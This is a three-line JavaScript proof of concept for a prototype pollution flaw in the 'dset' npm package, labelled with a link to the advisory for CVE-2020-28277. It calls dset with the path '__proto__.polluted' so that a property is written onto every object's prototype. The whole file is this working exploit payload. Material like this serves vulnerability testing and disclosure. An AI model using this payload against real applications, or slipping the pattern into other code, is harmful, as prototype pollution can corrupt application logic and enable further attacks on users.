//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
  const dset = require("dset");
  dset({}, "__proto__.polluted", "yes");
